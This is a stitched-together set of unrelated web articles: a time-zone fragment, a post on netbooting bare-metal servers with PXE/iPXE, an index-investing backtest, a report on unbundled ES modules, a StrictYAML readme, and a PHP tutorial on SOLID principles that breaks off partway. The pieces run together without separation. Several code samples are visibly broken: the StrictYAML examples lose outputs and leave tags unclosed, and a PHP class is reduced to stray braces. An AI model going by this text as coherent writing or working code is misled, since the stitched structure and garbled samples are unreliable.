If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates.

            <div>
            

            <p>I am sure you heard about bare metal. Clouds are made of bare metal, for example.</p>

<p>The art of bringing to life an unanimated piece of metal like a server to something useful is something I am learning since I joined <a href="https://metal.equinix.com/">Equinix Metal</a> in May.</p>

<p>Let me make a comparison with something you are probably familiar with. Do you know why Kubernetes is hard? Because there is not one Kubernetes. It is a glue of an unknown number of pieces working together to help you deploy your application.</p>

<p>Bare Metal is almost the same, hundreds of different providers, server size, architectures, chips that in some way you have to bring to life.</p>

<p>We have to work with some common concepts we have. When a server boots, it runs a BIOS that looks in different places for something to run:</p>

<ol>
  <li>It looks for a hard drive</li>
  <li>It looks for external storage like a USB stick or a CD-Rom</li>
  <li>It looks for help from your network (netbooting)</li>
</ol>

<p>Options one and two are not realistic if the end goal is to get to a handsfree, reliable solution. I am sure cloud providers do not have people running around with a USB stick containing operating systems and firmware.</p>

<h2 id="netbooting">Netbooting</h2>

<p>I spoke about <a href="https://gianarb.it/blog/first-journeys-with-netboot-ipxe">my first experience netbooting Ubuntu</a> on my blog. That article is efficient with reproducible code. Here the theory.</p>

<p>When it comes to netbooting, you have to know what PXE means. Preboot Execution Environment is a standardized client/server environment that boots when no operating system is found, and it helps an administrator boot an operating system remotely. Don’t think about this OS as the one you have in your laptop, I mean, technically it is, but the one your run there or in a server is persisted, that’s why you can have files that survive a reboot.</p>

<p>The one you start with PXE runs in memory, and from there, you have to figure out how to get the persisted OS you will run in your machine.</p>

<p>When the in-memory operation system is up and running, you can do everything you are capable of with Ubuntu, Alpine, CentOS, or Debian. In practice, what people tend to do is to run applications and scripts to format a disk with the right partition and to install the end operation system.</p>

<p>Pretty cool. PXE is kind of old, and for that reason, it is burned into a lot of different NICs. You will hear a lot more about iPXE, a “new” PXE implementation. What is cool about those is the <code>chain</code> function. From one PXE/iPXE environment, you can chain another PXE/iPXE environment. That’s how you get from PXE (that usually runs by default in a lot of hardware (if you have a NUC you run it)) to iPXE.</p>

<div><div><pre><code>chain --autofree https://boot.netboot.xyz/ipxe/netboot.xyz.lkrn
</code></pre></div></div>

<p>iPXE supports a lot more protocols usable to download OS from such as TFTP, FTP, HTTP/S, NFC…</p>

<p>This is an example of iPXE script:</p>

<div><div><pre><code>#!ipxe
dhcp net0

set base-url http://archive.ubuntu.com/ubuntu/dists/focal/main/installer-amd64/current/legacy-images/netboot/ubuntu-installer/amd64/
kernel ${base-url}/linux console=ttyS1,115200n8
initrd ${base-url}/initrd.gz
boot
</code></pre></div></div>

<p>The first command, <code>dhcp net0</code>, gets an IP for your hardware from the DHCP. <code>kernel</code> and <code>initrd</code> set the kernel and the initial ramdisk to run in memory.</p>

<p><code>boot</code> starts the <code>kernel</code> and the <code>initrd</code> you just set.</p>

<p>There is more; this is what I find myself using more often.</p>

<h3 id="infrastructure">Infrastructure</h3>

<p>To netboot successfully, you need to distribute a couple of things:</p>

<ol>
  <li>An iPXE script</li>
  <li>The operating system you want to run (kernel and initrd)</li>
</ol>

<h3 id="workflow">Workflow</h3>

<ol>
  <li>Server starts</li>
  <li>There is nothing to boot in the HD</li>
  <li>Starts netbooting</li>
  <li>It makes a DHCP request to get network configuration, and  the DHCP returns the TFTP address with the location of the iPXE binary</li>
  <li>iPXE starts and makes another DHCP request; the response contains the URL of the iPXE scripts with the commands you saw above</li>
  <li>At this point, iPXE runs the script, downloads the kernel, and the initrd with the protocol you specified, and it runs the in-memory operating system.</li>
</ol>

<p>Pretty cool!</p>

<h2 id="the-in-memory-operating-system">The in-memory operating system</h2>

<p>The in-memory operating system can be as smart as you like; you can build your one, for example, starting from Ubuntu or Alpine. Size counts here because it has to fit in memory.</p>

<p>When the operating system starts, it runs as PID 1, what is called <code>init.</code> It is an executable located in the ramdisk called <code>/init.</code> That script can be as complicated as you like. It can be a problematic binary that downloads from a centralized location commands to execute, or it can be bash scripts that format the local disk and installs the final operating system.</p>

<p>What I am trying to say is that you have to make the in-memory operating system useful for your purpose. If you use native Alpine or Ubuntu, the init script will start a bash shell, not that useful.</p>

<h2 id="dhcp">DHCP</h2>

<p>As you saw, the DHCP plays an important role. It is the first point of contact between unanimated hardware and the world. If you can control what the DHCP can do, you can, for example, register and monitor the healthiness of a server.</p>

<p>Imagine you are at your laptop, and you are expecting a hundred new servers in one of your datacenters, monitoring the DHCP requests. You will know when they are plugged into the network.</p>

<h2 id="containers-what">Containers what?</h2>

<p>Containers are a comfortable way to distribute and run applications without having to know how to run them. Think about this scenario. Your in-memory operating system at boot runs Docker. The <code>init</code> script at this point can pull and run a Docker container with your logic for partitioning the disk and installing an operating system, or it runs some workload and exit leaving space for the next boot (a bit like serverless, but with servers, way cooler).</p>

<p>Or the Docker Container can run a more complex application that reaches a centralized server that dispatches a list of actions to execute via a REST or gRPC API. Those actions can be declared and stored from you.</p>

<h2 id="conclusion">Conclusion</h2>

<p>The chain of tools and interactions to get from a piece of metal to something that runs some workload is not that long. Controlling all the steps and the tools along the way gives provides the ability to provisioning cold servers from zero to something that developers know better how to use.</p>

<p>Ok, I lied to you. This is not just theory. This is how <a href="https://tinkerbell.org/">Tinkerbell</a> works.</p>

                    <p>For quite some time I've been monitoring the markets, and waiting for a dip to invest my cash. However, a few weeks ago I decided to put this assumption to the test. Is buying the dip the best I could do with my hard earned cash?</p><ul><li>Like most employees, I have a salary and some yearly disposable income to dedicate to my long term savings or investments. Concretely, I have about <strong>£20000 a year to dedicate to my investments</strong>.</li><li>I decided to <strong>invest only on indexes</strong>, because I got burned with individual stocks (and crypto) multiple times (a.k.a. I am a terrible investor).</li><li><strong>Long term investments only</strong>. Monitoring the market daily/hourly is a massive drain of energy and time that I could dedicate to generate more cash to invest.</li></ul><ul><li>Buy daily same amount (Hardcore <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy monthly same amount (Simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy yearly same amount (Extremely simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy the dip (My own <em>shitty-wait-for-it-and-spend-shit-tons-of-time-monitoring strategy</em>)</li></ul><p>I used Python + <a href="https://github.com/mementum/backtrader">Backtrader library</a> to simulate my scenarios, and these were the results investing on the SPY ETF, ignoring commission fees because my broker offers zero commission transactions.</p><figure><img src="https://carlosbaraza.com/content/images/2020/10/index-strategies.jpg"></figure><p>This experiment was quite revealing for me, because it showed me that the return of investment (ROI) for spending 27 years monitoring the markets daily could easily be negative, compared with a hands-off strategy like dollar cost averaging monthly to the SPY.</p><p>If previous return history is an indicative of future returns, the extra time dedicated to monitoring the market without a clear edge is a waste of time, which is also a waste of money.</p><p><strong>The main takeaway is don't try to beat the market, just invest at set intervals on some diversified indexes, and don't look back, regardless of what the market does. Spend the extra time generating more cash to invest, and the magic of compounding and dollar cost averaging will do the rest.</strong></p><p><a href="https://twitter.com/carlosbaraza">Follow me on Twitter @carlosbaraza</a> if you like this type of content and I'll make more.</p><p>Other notes:</p><ul><li>The difference between investing daily, monthly and even yearly is pretty much negligible long term. Short term, it makes a bigger difference, being daily the best approach if your broker offers zero commissions.</li><li>This strategy depends on the market continuing appreciating. If the market was ever to reverse permanently, this strategy, and pretty much every strategy would fail.</li></ul><p>I am not a professional investor, nor a financial advisor, and arguably not even a good amateur investor 😜. This is just a simple experiment I run because I waste a lot of time and energy monitoring the market. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>For the last year, I’ve been running a single-page web app powered by ES modules in production.</p>
<p>It’s a JavaScript app but it doesn’t use Babel, Webpack, Rollup, or any other tooling for transpiling or bundling. The files I write in development are the same files that get served to end-users in production.</p>
<p>The app is for a side-project… an <a href="https://musicboxfun.com/">online music-box song making tool</a>. It’s not a massive app, but it’s not tiny either—there’s currently about 60 JavaScript modules, which are a mix of components, utilities, and third-party libraries. <a href="https://github.com/bryanbraun/music-box-fun/tree/master/site">The codebase</a> looks a lot like a ReactJS project, but it doesn’t use React. It uses a plain JavaScript alternative that substitutes abstractions (like JSX) with native JavaScript features (like template strings). The framework isn’t relevant for the purpose of this post but you can read more about it in <a href="https://www.bryanbraun.com/2019/09/11/web-dev-nirvana-and-why-I-needed-to-let-go-of-reactjs-to-reach-it/">my earlier post</a>, if you are curious.</p>
<p>When I launched the app in August 2019, the industry consensus was that using unbundled ES6 modules in production was a bad idea. Khan Academy tried unbundling their homepage JS and concluded that <a href="https://blog.khanacademy.org/forgo-js-packaging-not-so-fast/">it slowed down their initial page load</a>. That was five years ago and I still don’t know of anybody who seriously considers skipping the bundler and using ES6 modules in production.*</p>
<p>And that’s too bad because now that <a href="https://caniuse.com/es6-module">browser support for ES modules is great</a>, it seems like we could avoid a lot of <a href="https://www.bryanbraun.com/2019/04/16/nonsense/">nonsense</a> by just <a href="https://twitter.com/BryanEBraun/status/1295171120459546624">writing JavaScript that the browser understands</a> (at least for projects where it makes sense).</p>
<p>I kept looking for examples of people doing this but I struggled to find them, so I decided I’d give it a try and see how bad it really was. Here’s what I found:</p>
<h2 id="things-that-met-expectations">Things that met expectations</h2>
<p><strong>Development experience.</strong> I expected the development experience to be great, and it was. There’s no setup instructions, no startup delays. No need to watch files, generate source maps, or wait for things to recompile. Just save the file and refresh. ✨</p>
<p><strong>Deployment.</strong> Deployment was straightforward. All I needed to do was copy my code to the server as-is. My web host Netlify makes it easy to do this on git push (though, to be fair, Netlify can make even the most complex setups easy to deploy).</p>
<p><strong>Dev/Prod parity.</strong> Every time I found a production bug I was able to reproduce it locally. Not a major goal, but very convenient.</p>
<h2 id="things-that-were-worse-than-expected">Things that were worse than expected</h2>
<p><strong>Dependencies not supporting ES modules.</strong>
I often found libraries I wanted to use, only to learn that they didn’t support ES modules. They usually supported CommonJS instead, which meant I couldn’t use them. At first, I was working around this by loading versions of the library that use browser globals (either via script tag, or <a href="https://stackoverflow.com/q/41127479/1154642">side-effects import</a>). This worked, but it didn’t feel ideal.</p>
<p>Eventually, I started using <a href="https://www.snowpack.dev/">Snowpack</a>, which can import dependencies that don’t support ES modules and produce a one-time build that does. This worked so well that <a href="https://github.com/sparkbox/bouncy-ball/pull/104">I’ve started using it on other projects</a>.</p>
<p><strong>Environment variables.</strong> Typically, I’d assign these at build-time but you can’t when there’s no build. Fortunately, Cory House has <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/">a great post describing all the options</a>. I ended up using <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/#option-6-environment-sniffing">environment sniffing</a> which feels a little weird, but ultimately isn’t a big deal for my app.</p>
<p><strong>CSS organization.</strong> I went with traditional CSS using BEM conventions, which was fine. I still wanted to break up my files though, so I used a <code>main.css</code> file with a bunch of <code>@imports</code>. That felt better, but then I had a blocking request that delayed page rendering so <a href="https://github.com/bryanbraun/music-box-fun/commit/dc2cc62c58ae61d972c124a433ca00d9aac304a2">I moved the <code>@imports</code> into an inline style tag</a>. I’m not sure if I like it, so I may keep iterating on this.</p>
<h2 id="things-that-were-better-than-expected">Things that were better than expected</h2>
<p><strong>Cache invalidation.</strong> I was worried that I was going to have trouble invalidating cached CSS or JavaScript (since I couldn’t rely on a bundler to give my assets cache-busting filenames). It turns out that <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETags</a> are a great solution for this (especially since <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">my web host has a solid implementation that’s quick and simple</a>). I’ve heard that cache-busting filenames can be a bit faster than Etags, but Netlify’s implementation feels pretty snappy to me.</p>
<p><strong>Performance.</strong>
Everything I heard said that ES module performance was going to be terrible, even with HTTP/2. So I braced myself and… it’s been great. I haven’t even done any optimizations beyond making sure that my initial HTML file had some good default markup. I suspect the performance is good because my app isn’t big enough to start hitting any bottlenecks yet (<a href="https://v8.dev/features/modules#performance">this research</a> says you’ll be fine if you’re below a couple hundred modules, which <a href="https://twitter.com/lukejacksonn/status/1318158374878457857">seems to be confirmed anecdotally</a>). This made me realize that that my intuition was off on what was “too big” of an app. You can go a long way before you’re in a place where you need to load 300-500 files, all at once. It feels unlikely that I’ll reach those limits on my app, at least.</p>
<p>I was a little worried about not minifying my JavaScript. Isn’t that a huge number of bytes saved? It turns out that the difference is a lot smaller when your files are served gzipped (or <a href="https://www.netlify.com/blog/2020/05/20/gain-instant-performance-boosts-as-brotli-comes-to-netlify-edge/">brotli-compressed, as in my case</a>). Minifying would still make my files smaller by renaming variables and stripping out comments, but the difference was less than I expected.</p>
<p><strong>Browser support.</strong> Since I wasn’t using Babel, I expected lots of cross-browser issues but they were rare.** It turns out that once you drop IE11 support, browser support of modern JS features is really good. Things like arrow functions, const/let, template strings, ES6 classes, and <code>fetch</code> all have over 95% global support (and that’s including IE11). The only time I didn’t get to use a JS feature I really wanted was <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">the optional chaining operator</a>, and that feature will probably have 95% support in the next year or two. Evergreen browsers are a powerful thing.</p>
<h2 id="overall-assessment">Overall Assessment</h2>
<p>I’ve been pleasantly surprised. If this were a typical, bundled, single-page-application, I would have needed to deal with one or two major tooling upgrades by now. Instead, I’ve been able to focus on features. <a href="https://blog.jim-nielsen.com/2020/cheating-entropy-with-native-web-tech/">Native web technologies FTW</a>!</p>
<p>If my module count gets so big that performance starts to noticeably degrade, I’m pretty confident that I’ll be able to use Snowpack to work through it. From <a href="https://www.snowpack.dev/#bundle-for-production">their docs</a>:</p>
<blockquote>
<p>Snowpack treats bundling as an optional production optimization, which means you’re free to skip over the extra complexity of bundling until you need it. <strong>You should be able to use a bundler because you want to, and not because you need to</strong>.</p>
</blockquote>
<p>I like this idea of postponing complexity. It feels very agile.</p>
<p>Maybe ES modules aren’t for every project but they’ve worked pretty well for mine. If there are fundamental flaws, I haven’t found them yet.</p>
<p>Honestly, it’s hard for me to imagine building a side-project any other way right now.</p>

** More accurately, I <em>have</em> faced some cross-browser issues but they weren’t the kind that Babel could help me with. Babel’s polyfills don’t help when <a href="https://github.com/bryanbraun/intersection-observer-issue">the browser implementation has bugs</a> or <a href="https://github.com/bryanbraun/music-box-fun/issues/7#issuecomment-643037151">your approach is fundamentally flawed</a>. 🙃

<p>StrictYAML is a <a href="https://en.wikipedia.org/wiki/Type_safety">type-safe</a> YAML parser
that parses and validates a <a href="https://hitchdev.com/strictyaml/features-removed">restricted subset</a> of the <a href="https://hitchdev.com/strictyaml/what-is-yaml">YAML</a>
specification.</p>

<p>Priorities:</p>

<ul>
<li>Beautiful API</li>
<li>Refusing to parse <a href="https://hitchdev.com/strictyaml/features-removed">the ugly, hard to read and insecure features of YAML</a> like <a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">the Norway problem</a>.</li>
<li>Strict validation of markup and straightforward type casting.</li>
<li>Clear, readable exceptions with <strong>code snippets</strong> and <strong>line numbers</strong>.</li>
<li>Acting as a near-drop in replacement for pyyaml, ruamel.yaml or poyo.</li>
<li>Ability to read in YAML, make changes and write it out again with comments preserved.</li>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Not speed</a>, currently.</li>
</ul>

<p>Simple example:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div><div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span></code></pre></div>
<p>Default parse result:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span>
<span>YAML</span><span>(</span><span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])]))</span></code></pre></div>
<p>All data is string, list or OrderedDict:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>Quickstart with schema:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<span>schema</span> <span>=</span> <span>Map</span><span>({</span><span>"name"</span><span>:</span> <span>Str</span><span>(),</span> <span>"age"</span><span>:</span> <span>Int</span><span>(),</span> <span>"possessions"</span><span>:</span> <span>Seq</span><span>(</span><span>Str</span><span>())})</span></code></pre></div>
<p>42 is now parsed as an integer:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>

<p>A YAMLError will be raised if there are syntactic problems, violations of your schema or use of disallowed YAML features:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span></code></pre></div>
<p>For example, a schema violation:</p>
<div><pre><code data-lang="python"><span>try</span><span>:</span>
    <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>except</span> <span>YAMLError</span> <span>as</span> <span>error</span><span>:</span>

</span><span>    </span>^<span> </span>(line<span>:</span><span> </span><span>3</span>)</code></pre></div>
<p>If parsed correctly:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<p>You can modify values and write out the YAML with comments preserved:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>SOLID outlines a group of guidelines that developers can use to simplify and clarify their code. While they are certainly not laws, understanding these concepts will make you a better developer. In overview, the five SOLID principles are:</p>
<ul>
<li>Single-responsibility principle; A class should only have a single responsibility, that is, only changes to one part of the software's specification should be able to affect the specification of the class.</li>
<li>Open–closed principle; Your classes should be open for extension but closed for modification.</li>
<li>Liskov substitution principle; Objects in a program should be replaceable with instances of their subtypes without altering the correctness of that program.</li>
<li>Interface segregation principle; Many client-specific interfaces are better than one general-purpose interface.</li>
<li>Dependency inversion principle; One should depend upon abstractions, not concretions.
Don't worry if you don't understand what all those mean at the first time of reading - I didn't. I will now go over each principle one by one, and try to explain not just how they work, but how they will benefit you in the long run.</li>
</ul>
<h2 id="single-responsibility-principle">Single-responsibility principle</h2>
<p>The most common of the SOLID design principles, the single responsibility principle states that a class should have only one reason to change. When a class handles more than one responsibility, any changes made to the functionalities may propagate throughout the application in unexpected ways. This unexpected behaviour can be bad enough if you have a smaller application but can become a nightmare when you work with large, enterprise-level software. By making sure that each function only encapsulates only one responsibility, you can save a lot of testing time and create a more maintainable architecture.</p>
<p>Let me show you an example. I will use PHP but you can apply SOLID design principles to any other OOP languages, too.</p>
<p>Let's imagine we have a class that represents a text document, where said document has a title and content. This document must be able to be exported to HTML and PDF.</p>
<pre><code><span>&lt;?php</span>

<span>class</span><span> </span><span>Document</span>
<span>{</span>
<span>    </span><span>protected</span><span> </span><span>$</span><span>title</span><span>;</span>
<span>    </span><span>protected</span><span> </span><span>$</span><span>content</span><span>;</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>__construct</span><span>(</span><span>string</span><span> </span><span>$</span><span>title</span><span>, </span><span>string</span><span> </span><span>$</span><span>content</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>$</span><span>this</span><span>-&gt;</span><span>title</span><span> </span><span>=</span><span> </span><span>$</span><span>title</span><span>;</span>
<span>        </span><span>$</span><span>this</span><span>-&gt;</span><span>content</span><span>=</span><span> </span><span>$</span><span>content</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>getTitle</span><span>()</span><span>: </span><span>string</span>
<span>    </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>$</span><span>this</span><span>-&gt;</span><span>title</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>getContent</span><span>()</span><span>: </span><span>string</span>
<span>    </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>$</span><span>this</span><span>-&gt;</span><span>content</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>exportHtml</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>DOCUMENT EXPORTED TO HTML</span><span>"</span><span>.</span><span>PHP_EOL</span><span>;</span><span>echo</span><span> </span><span>"</span><span>Title: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getTitle</span><span>()</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Content: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getContent</span><span>()</span><span>.</span><span>PHP_EOL</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>exportPdf</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>DOCUMENT EXPORTED TO PDF</span><span>"</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Title: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getTitle</span><span>()</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Content: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getContent</span><span>()</span><span>.</span><span>PHP_EOL</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>In this case, it is not the responsibility of the document to export itself to a particular format, the document should only be a representation of itself.</p>
<p>The key to solving this is to move each of the export methods into their own classes, which will implement an "Exportable" interface.</p>
<pre><code><span>&lt;?php</span>
<span>interface</span><span> </span><span>ExportableDocumentInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>export</span><span>(</span><span>Document</span><span> </span><span>$</span><span>document</span><span>);</span>
<span>}</span></code></pre>
<p>The next thing we have to do is extract the logic that does not apply to the class.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>PdfExportableDocument</span><span> </span><span>implements</span><span> </span><span>ExportableDocumentInterface</span>

<span>    </span><span>}</span>
<span>}</span>

<h2 id="openclosed-principle">Open–closed principle</h2>
<p>The open-closed principle states that objects or entities should be open for extension, but closed for modification. This is one of those principles that developers often skip over - but try not to. These techniques are paramount to mature design.</p>
<p>So, you should be able to extend your existing code using features like inheritance via subclasses and interfaces. However, you should never modify classes, interfaces, and other code units that already exist, as it can lead to unexpected behaviour. If you add a new feature by extending your code rather than modifying it, you reduce the risk of failure as much as possible.</p>
<p>Let's imagine that we need to achieve a login system. To authenticate our user we require a username and a password, so far so good. So what happens a year later if we want the ability for a user to authenticate through Twitter or Facebook? It is important to understand that what has been asked of us is not a change to a current feature, but rather to build a new feature.</p>
<p>Let's say our authentication class looks like this, where you call an authenticate method for your user.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>LoginService</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>login</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>When it comes to implementing our third-party user, we may want to try something like this, where we check what type of user we have using an if statement, and executing code accordingly.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>LoginService</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>login</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>if</span><span> (</span><span>$</span><span>user</span><span> </span><span>instanceof</span><span> </span><span>User</span><span>) </span><span>{</span>
<span>            </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>        </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> (</span><span>$</span><span>user</span><span> </span><span>instanceOf</span><span> </span><span>ThirdPartyUser</span><span>) </span><span>{</span>
<span>            </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateThirdPartyUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>This isn't good because we are modifying code that already is in place. It may look good now, but what happens when you are supporting five or 6 authentication types? Instead, you should abstract and work to an interface. The first thing we should do is build an interface that complies with what we want to do for the specific use case.</p>
<pre><code><span>&lt;?php</span>
<span>interface</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>);</span>
<span>}</span></code></pre>
<p>Now we can decouple the logic that we had already created for our use case and implement it in a class that implements our interface.</p>
<pre><code><span>&lt;?php</span>

<span>class</span><span> </span><span>UserAuthentication</span><span> </span><span>implements</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>// TODO: Implement authenticateUser() method.</span>
<span>    </span><span>}</span>
<span>}</span>

<span>Class</span><span> </span><span>ThirdPartyUserAuthentication</span><span> </span><span>implements</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>// TODO: Implement authenticateUser() method.</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>Now our LoginService class doesn't care what type of user we have, it just interacts with a 'LoginInterface'.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>LoginService</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>login</span><span>(</span><span>LoginInterface</span><span> </span><span>$</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>$</span><span>user</span><span>-&gt;</span><span>authenticateUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<h2 id="liskov-substitution">Liskov Substitution</h2>
<p>Coined by Barbara Liskov, this principle states that any implementation of an abstraction (interface) should be substitutable in any place that abstraction is accepted.</p>
<p>In layman’s terms, it states that an object of a parent class should be replaceable by objects of its child class without causing issues in the application. So, a child class should never change the characteristics of its parent class (such as the argument list and return types). You can implement the Liskov Substitution Principle by paying attention to the correct inheritance hierarchy.</p>
<p>Let's say we have a Shipping class that is going to calculate the shipping cost of a product given its weight and destination.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>Shipping</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>calculateShippingCost</span><span>($</span><span>weightOfPackageKg</span><span>, </span><span>$</span><span>destiny</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>// Pre-condition:</span>
<span>        </span><span>if</span><span> (</span><span>$</span><span>weightOfPackageKg</span><span> </span><span>&lt;=</span><span> </span><span>0</span><span>) </span><span>{</span>
<span>            </span><span>throw</span><span> </span><span>new</span><span> </span><span>\</span><span>Exception</span><span>(</span><span>'</span><span>Package weight cannot be less than or equal to zero</span><span>'</span><span>)</span><span>;</span>
<span>        </span><span>}</span>

<span>        </span><span>// We calculate the shipping cost by</span>
<span>        </span><span>$</span><span>shippingCost</span><span> </span><span>=</span><span> </span><span>rand</span><span>(</span><span>5</span><span>, </span><span>15</span><span>)</span><span>;</span>

<span>        </span><span>// Post-condition</span>
